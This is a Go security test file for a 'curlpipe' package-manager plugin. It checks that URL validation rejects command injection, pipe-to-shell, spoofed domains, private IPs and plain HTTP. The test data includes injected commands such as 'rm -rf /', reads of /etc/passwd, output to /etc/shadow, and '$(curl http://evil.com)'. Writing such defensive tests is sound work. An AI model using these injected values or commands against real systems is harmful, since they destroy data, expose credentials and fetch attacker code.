package main_test

import (
	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	main "github.com/jameswlane/devex/packages/package-manager-curlpipe"
)

var _ = Describe("Curlpipe Security", func() {
	var plugin *main.CurlpipePlugin

	BeforeEach(func() {
		plugin = main.NewCurlpipePlugin()
	})

	Describe("Command Injection Prevention", func() {
		Context("URL-based injection attempts", func() {
			It("should prevent injection via malicious URLs", func() {
				maliciousURLs := []string{
					"https://get.docker.com/install.sh; rm -rf /",
					"https://get.docker.com/install.sh && whoami",
					"https://get.docker.com/install.sh | sh",
					"https://get.docker.com/`id`",
					"https://get.docker.com/$(id)",
					"-o/etc/shadow",
					"--output=/etc/shadow",
					"-k",
				}
				for _, u := range maliciousURLs {
					err := plugin.ValidateURL(u)
					Expect(err).To(HaveOccurred(), "URL should be rejected: %s", u)
					err = plugin.ValidateScriptURL(u)
					Expect(err).To(HaveOccurred(), "Script URL should be rejected: %s", u)
				}
			})

			It("should prevent injection via URL parameters", func() {
				badParamURLs := []string{
					"https://get.docker.com/install.sh?v=1;cat /etc/passwd",
					"https://get.docker.com/install.sh?v=$(cat /etc/passwd)",
					"https://get.docker.com/install.sh?v=`reboot`",
					"https://get.docker.com/install.sh?v=1&x=2|sh",
				}
				for _, u := range badParamURLs {
					err := plugin.ValidateURL(u)
					Expect(err).To(HaveOccurred())
				}
			})

			It("should prevent injection via URL fragments", func() {
				badFragmentURLs := []string{
					"https://get.docker.com/install.sh#;rm -rf /",
					"https://get.docker.com/install.sh#`id`",
					"https://get.docker.com/install.sh#$(id)",
				}
				for _, u := range badFragmentURLs {
					err := plugin.ValidateURL(u)
					Expect(err).To(HaveOccurred())
				}
			})
		})

		Context("Shell injection prevention", func() {
			It("should safely handle URLs with shell metacharacters", func() {
				dangerous := []string{
					"https://get.docker.com/a;b",
					"https://get.docker.com/a&&b",
					"https://get.docker.com/a||b",
					"https://get.docker.com/a|b",
					"https://get.docker.com/a>b",
					"https://get.docker.com/a<b",
					"https://get.docker.com/a`b",
					"https://get.docker.com/a$b",
					"https://get.docker.com/a(b",
					"https://get.docker.com/a)b",
					"https://get.docker.com/a\\b",
					"https://get.docker.com/a'b",
					"https://get.docker.com/a\"b",
				}
				for _, u := range dangerous {
					err := plugin.ValidateURL(u)
					Expect(err).To(HaveOccurred())
				}
			})

			It("should prevent command substitution attacks", func() {
				substitutions := []string{
					"https://get.docker.com/$(curl http://evil.com)",
					"https://get.docker.com/`curl http://evil.com`",
				}
				for _, u := range substitutions {
					err := plugin.ValidateURL(u)
					Expect(err).To(HaveOccurred())
				}
			})

			It("should prevent pipe injection attacks", func() {
				pipes := []string{
					"https://get.docker.com/install.sh | bash",
					"https://get.docker.com/install.sh|bash",
					"https://get.docker.com/install.sh | sh",
				}
				for _, u := range pipes {
					err := plugin.ValidateURL(u)
					Expect(err).To(HaveOccurred())
				}
			})
		})
	})

	Describe("Domain Validation Security", func() {
		Context("trusted domain bypass attempts", func() {
			It("should prevent subdomain spoofing", func() {
				fakeDomains := []string{
					"evil-get.docker.com",
					"get.docker.com.attacker.com",
					"attacker-github.com",
				}
				for _, d := range fakeDomains {
					Expect(plugin.IsTrustedDomain(d)).To(BeFalse())
				}
			})

			It("should prevent IP address bypasses", func() {
				ipURLs := []string{
					"https://127.0.0.1/script.sh",
					"https://localhost/script.sh",
					"https://10.0.0.1/script.sh",
					"https://192.168.1.1/script.sh",
					"https://172.16.0.1/script.sh",
				}
				for _, u := range ipURLs {
					err := plugin.ValidateScriptURL(u)
					Expect(err).To(HaveOccurred())
				}
			})
		})
	})

	Describe("Network Security", func() {
		Context("HTTPS enforcement", func() {
			It("should reject HTTP URLs and require HTTPS", func() {
				httpURLs := []string{
					"http://get.docker.com/install.sh",
					"http://sh.rustup.rs",
					"http://raw.githubusercontent.com/user/repo/main/install.sh",
				}
				for _, u := range httpURLs {
					err := plugin.ValidateURL(u)
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(ContainSubstring("only HTTPS URLs are allowed"))

					err = plugin.ValidateScriptURL(u)
					Expect(err).To(HaveOccurred())
				}
			})
		})
	})
})
